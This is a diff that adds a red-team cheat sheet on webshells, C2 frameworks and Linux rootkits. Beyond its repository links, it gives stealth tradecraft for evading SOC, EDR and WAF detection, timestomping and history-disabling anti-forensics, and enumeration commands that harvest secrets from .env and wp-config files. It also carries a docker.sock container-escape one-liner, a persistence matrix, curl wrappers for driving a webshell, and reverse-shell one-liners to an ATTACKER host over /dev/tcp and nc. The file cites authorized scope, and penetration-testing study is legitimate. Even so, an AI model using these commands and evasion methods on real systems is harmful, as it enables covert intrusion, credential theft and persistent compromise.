@@ -1,0 +1,340 @@
+====================================================================
+ RED TEAM RESOURCES — WEBSHELLS, BACKDOORS, C2, ROOTKITS
+ Compiled from session notes
+ (Plain-text version with full clickable URLs)
+====================================================================
+
+WARNINGS (read first)
+--------------------------------------------------------------------
+1. Public webshells are the MOST signatured files in existence.
+   SOC vendors harvest YARA/Suricata rules directly from these repos.
+   Good for learning/labs; terrible on a monitored client host.
+   Study them, then write your own minimal custom loader.
+
+2. "Webshell collection" repos are a supply-chain risk to YOU.
+   Some contain PHP that beacons to the author, or outright malware
+   aimed at researchers. Clone into a throwaway VM, read the code,
+   never run tooling on your host or with real credentials.
+
+3. Authorized scope only. Verify Rules of Engagement.
+
+
+====================================================================
+1) ONE-STOP AGGREGATORS  ("all at a place")
+====================================================================
+infosecn1nja/Red-Teaming-Toolkit
+  https://github.com/infosecn1nja/Red-Teaming-Toolkit
+Z4nzu/hackingtool
+  https://github.com/Z4nzu/hackingtool
+enaqx/awesome-pentest
+  https://github.com/enaqx/awesome-pentest
+yeyintminthuhtut/Awesome-Red-Teaming
+  https://github.com/yeyintminthuhtut/Awesome-Red-Teaming
+kurogai/100-redteam-projects
+  https://github.com/kurogai/100-redteam-projects
+swisskyrepo/PayloadsAllTheThings
+  https://github.com/swisskyrepo/PayloadsAllTheThings
+danielmiessler/SecLists
+  https://github.com/danielmiessler/SecLists
+carlospolop/PEASS-ng
+  https://github.com/carlospolop/PEASS-ng
+
+
+====================================================================
+2) WEBSHELL COLLECTIONS & MANAGERS
+====================================================================
+tennc/webshell
+  https://github.com/tennc/webshell
+JohnTroony/php-webshells
+  https://github.com/JohnTroony/php-webshells
+b374k/b374k
+  https://github.com/b374k/b374k
+LandGrey/webshell-detect-bypass
+  https://github.com/LandGrey/webshell-detect-bypass
+yzddmr6/WebShell
+  https://github.com/yzddmr6/WebShell
+threedr3am/JSP-Webshells
+  https://github.com/threedr3am/JSP-Webshells
+epinna/weevely3
+  https://github.com/epinna/weevely3
+rebeyond/Behinder
+  https://github.com/rebeyond/Behinder
+BeichenDream/Godzilla
+  https://github.com/BeichenDream/Godzilla
+AntSwordProject/antSword
+  https://github.com/AntSwordProject/antSword
+k8gege/K8tools
+  https://github.com/k8gege/K8tools
+k8gege/Ladon
+  https://github.com/k8gege/Ladon
+
+Notes:
+- Behinder / Godzilla / AntSword are the most capable managers
+  (encrypted channels, plugins, DB/file/terminal modules) but are
+  exactly what modern EDR/WAF profiles target.
+- Godzilla "memory shell" (no file on disk after load) is the
+  interesting one conceptually.
+
+
+====================================================================
+3) C2 / IMPLANTS / BACKDOOR FRAMEWORKS
+====================================================================
+BishopFox/sliver
+  https://github.com/BishopFox/sliver
+HavocFramework/Havoc
+  https://github.com/HavocFramework/Havoc
+its-a-feature/Mythic
+  https://github.com/its-a-feature/Mythic
+BC-SECURITY/Empire
+  https://github.com/BC-SECURITY/Empire
+Cobalt-Strike/community_kit
+  https://github.com/Cobalt-Strike/community_kit
+Ne0nd0g/merlin
+  https://github.com/Ne0nd0g/merlin
+n1nj4sec/pupy
+  https://github.com/n1nj4sec/pupy
+quasar/Quasar
+  https://github.com/quasar/Quasar
+gentilkiwi/mimikatz
+  https://github.com/gentilkiwi/mimikatz
+TheWover/donut
+  https://github.com/TheWover/donut
+SecureAuthCorp/impacket
+  https://github.com/SecureAuthCorp/impacket
+Pennyw0rth/NetExec
+  https://github.com/Pennyw0rth/NetExec
+
+
+====================================================================
+4) LINUX ROOTKITS / KERNEL BACKDOORS
+====================================================================
+m0nad/Diamorphine
+  https://github.com/m0nad/Diamorphine
+nurupo/rootkit
+  https://github.com/nurupo/rootkit
+f0rb1d/Reptile   (verify current path; project has moved)
+  https://github.com/f0rb1d/Reptile
+Gui774ume/ebpfkit
+  https://github.com/Gui774ume/ebpfkit
+h3xduck/TripleCross
+  https://github.com/h3xduck/TripleCross
+xcellerator/linux_kernel_hacking
+  https://github.com/xcellerator/linux_kernel_hacking
+GTFOBins/GTFOBins.github.io
+  https://github.com/GTFOBins/GTFOBins.github.io
+LOLBAS-project/LOLBAS
+  https://github.com/LOLBAS-project/LOLBAS
+
+Tip: read xcellerator/linux_kernel_hacking + m0nad/Diamorphine
+side by side to understand the ring-0 game fast.
+
+
+====================================================================
+5) REVERSE SHELLS / PAYLOAD REFERENCES
+====================================================================
+pentestmonkey/php-reverse-shell
+  https://github.com/pentestmonkey/php-reverse-shell
+swisskyrepo/PayloadsAllTheThings  (/Reverse Shell Cheatsheet, /Web Snippets)
+  https://github.com/swisskyrepo/PayloadsAllTheThings
+danielmiessler/SecLists  (/Web-Shells)
+  https://github.com/danielmiessler/SecLists
+
+
+====================================================================
+6) DETECTION SURFACE (what the SOC sees)
+====================================================================
+Web access log  - method, URI, UA, status, bytes (NOT POST body)
+WAF             - inspects body + URI (eval/base64/system/known shells)
+FIM             - AIDE/Tripwire/Wazuh/OSSEC on webroot (new/modified file)
+EDR             - process tree + file integrity
+                  #1 SIGNAL: php-fpm/www-data spawning sh/bash/curl/wget/nc
+Network         - NDR, JA3/JA4 TLS fingerprint, egress (reverse shells)
+App/PHP logs    - error log, slow log (stack traces)
+SIEM            - correlation (low-and-slow POSTs to rare path, timing)
+
+Stealth design goal: NO child processes, NO new-signature file,
+payload buried inside traffic the app already produces.
+
+
+====================================================================
+7) STEALTH MODEL — FOUR LAYERS
+====================================================================
+FILE LAYER
+  - no known public shell
+  - blend filename with framework conventions
+  - match owner/group/mode/mtime to siblings: touch -r neighbor file
+  - prefer legit churn dirs (uploads/cache) if FIM excludes them
+  - tiny, no tool fingerprints, no literal eval/base64_decode/system
+  - remove editor backups (.swp, ~)
+  - best: don't drop a file at all (LOTL)
+
+REQUEST LAYER
+  - POST not GET (access logs record URI, usually not body)
+  - innocuous param names (action/_token/q/view/data) never cmd/c/exec
+  - encrypt/encode payload (unique impl, not Godzilla's known structure)
+  - same UA/cookies/headers as real users; hit an existing app path
+  - business hours in target TZ, low volume, jitter
+
+PROCESS LAYER
+  - stay in pure PHP: file_get_contents/file_put_contents, curl ext, PDO
+  - avoid system/exec/shell_exec/passthru/proc_open/popen
+  - if shell needed, go through an existing app feature that spawns
+
+NETWORK LAYER
+  - HTTPS (wire hidden) but watch JA3/JA4 fingerprint
+  - curl != browser -> use curl-impersonate / headless browser if NDR
+  - egress: reverse shells get caught; prefer HTTP polling / app SSRF
+  - source IP: avoid flagged VPS/cloud ranges; blend geo/ASN
+
+
+====================================================================
+8) SHELL CHOICE RANKED BY STEALTH
+====================================================================
+1. Custom minimal shell you wrote (no public signature)  <-- best
+2. No file: living off the land (app admin features, deserialization,
+   SSTI, LFI+log poisoning)
+3. DB-resident code (no webroot file for FIM)
+4. Behinder / Godzilla (encrypted traffic but signatured stubs)
+5. weevely / AntSword / China Chopper / c99 / r57 / b374k
+   -> assume detected; do not use on monitored targets
+
+
+====================================================================
+9) PRIVESC: WEBSHELL -> ROOT -> KERNEL  (methodology)
+====================================================================
+Chain: webshell(www-data) -> stable session -> privesc -> root ->
+       pick stealth layer (LKM / eBPF / LD_PRELOAD).
+
+Quick checks:
+  id; hostname; uname -a; cat /etc/os-release
+  cat /proc/self/status | grep -E 'Cap|Seccomp|NoNewPrivs'
+  ls -la /.dockerenv; cat /proc/1/cgroup        (container?)
+  sudo -n -l
+  find / -perm -4000 -type f 2>/dev/null        (SUID)
+  getcap -r / 2>/dev/null                       (capabilities)
+  find /etc /opt /usr/local -writable -type f 2>/dev/null
+  ls -la /etc/cron* ; systemctl list-timers --all
+  ps aux --forest ; ss -tulpn
+  grep -rEi 'password|secret|api[_-]?key|DB_' /var/www
+  cat /var/www/**/wp-config.php /var/www/**/.env
+  find / -name 'id_*' -o -name 'authorized_keys' 2>/dev/null
+Tools: LinPEAS, linux-exploit-suggester (les.sh), pspy64,
+       GTFOBins, Deepce (docker escape), traitor.
+
+Vector ranking (webservers):
+  1. App creds reuse (DB creds -> sudo/SSH)
+  2. sudo misconfig (env_keep LD_PRELOAD, NOPASSWD interpreter)
+  3. SUID on GTFOBins binary
+  4. Kernel LPE (match uname -r):
+     - CVE-2022-0847 Dirty Pipe   5.8 -> 5.16.11 (very reliable)
+     - CVE-2021-4034 PwnKit       SUID pkexec, near-universal
+     - CVE-2021-3156 Baron Samedit sudo 1.8.2-1.8.31p2/1.9.0-1.9.5p1
+     - CVE-2024-1086 nf_tables    ~5.14-6.6 (needs unprivileged userns)
+     - CVE-2023-2640/32629 Ubuntu OverlayFS "GameOver(lay)" 22.04/23.04
+     - CVE-2016-5195 Dirty COW    2.6-4.8
+  5. Writable systemd unit / ld.so.conf.d / cron wildcard
+  6. NFS no_root_squash / MySQL root UDF / docker group
+  7. Container escape
+
+Container escape:
+  docker.sock mounted -> docker -H unix:///var/run/docker.sock run
+                        -v /:/host --privileged -it alpine chroot /host
+  privileged container -> mount host disk, chroot
+  cgroup v1 release_agent / core_pattern escape
+  k8s -> /var/run/secrets/kubernetes.io/serviceaccount/token
+
+
+====================================================================
+10) ROOTKIT SELECTION (after root)
+====================================================================
+Root + headers + no signing/lockdown -> LKM via ftrace (ring-0)
+Root + MODULE_SIG_FORCE/lockdown     -> eBPF (hook syscalls)
+Root + minimal build risk            -> LD_PRELOAD userland
+Web-user only                        -> .user.ini / PHP ext
+                                        (persistence, NOT a rootkit)
+
+Check before choosing:
+  cat /proc/sys/kernel/modules_disabled
+  cat /sys/kernel/security/lockdown
+  mokutil --sb-state
+  grep MODULE_SIG /boot/config-$(uname -r)
+  cat /proc/sys/kernel/unprivileged_bpf_disabled
+  ls /lib/modules/$(uname -r)/build
+
+
+====================================================================
+11) PERSISTENCE MATRIX
+====================================================================
+.user.ini auto_prepend_file     no root   survive reboot  app-layer
+php.ini extension=              root      yes             version-locked
+/etc/ld.so.preload              root      yes             global, noisy
+systemd unit/timer              root      yes             eBPF/daemon
+eBPF pinned program             root      yes (with unit) no module sig
+/etc/modules-load.d             root      yes             LKM
+initramfs injection             root      yes             earliest
+UEFI/bootloader                 root+rb   yes             firmware
+
+
+====================================================================
+12) CONTROLLING A WEBSHELL FROM TERMINAL
+====================================================================
+Raw curl:
+  curl -s -X POST 'http://target/shell.php' --data-urlencode 'cmd=id'
+  curl -s 'http://target/shell.php?cmd=id'
+  curl -s -b 'PHPSESSID=abc' -X POST URL --data-urlencode 'cmd=whoami'
+
+Bash wrapper:
+  ws() { curl -s --max-time 30 -X POST "${WS_URL}" \
+           --data-urlencode "cmd=$*" -A 'Mozilla/5.0' 2>&1 \
+           | sed 's/<br *\/\?>/\n/gi'; }
+
+rlwrap loop:
+  rlwrap -H /dev/null -p 'shell> ' bash -c '
+    while IFS= read -r c; do [ "$c" = exit ] && break;
+      curl -s -X POST "URL" --data-urlencode "cmd=$c"; done'
+
+weevely (purpose-built CLI):
+  weevely generate 'Pass' /tmp/s.php
+  weevely 'http://target/uploads/s.php' 'Pass'
+
+Limits: stateless (cd/export don't persist), no TTY, stdout only
+(append 2>&1), max_execution_time, disable_functions, HTML-wrapped
+output.
+
+Better: webshell -> reverse shell -> Sliver/Havoc/Mythic session.
+  bash -i >& /dev/tcp/ATTACKER/4443 0>&1
+  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER 4443 > /tmp/f
+  stabilize: python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+====================================================================
+13) STAYING SILENT — OPSEC NOTES
+====================================================================
+- export HISTFILE=/dev/null; unset HISTFILE
+- stage in /dev/shm or memfd, not /tmp or webroot
+- timestomp drops: touch -r /usr/bin/ls yourfile
+- no reboots, no unnecessary service restarts
+- scope find, avoid mass filesystem scans
+- assume initial access is already logged; weigh log tampering
+  (gaps/integrity alerts usually worse than the entry)
+- keep an engagement log of every host change for cleanup
+
+
+====================================================================
+14) LEARNING PATH
+====================================================================
+- HackTricks (Linux Privilege Escalation)
+- GTFOBins
+- PayloadsAllTheThings (privesc + container escape)
+- THM: Linux PrivEsc, Linux Kernel Exploitation
+- HTB: easy Linux boxes -> Pro Labs
+- pwn.college: kernel module + kernel exploitation tracks
+- OSCP -> OSEP (evasion/payloads), CRTO (red team ops)
+- Kernel exploitation theory: Andrey Konovalov blog, Google
+  kernelCTF writeups, "A Guide to Kernel Exploitation"
+- Rootkits: read Reptile, Diamorphine, Azazel, ebpfkit, TripleCross
+
+
+====================================================================
+ END OF FILE
+====================================================================
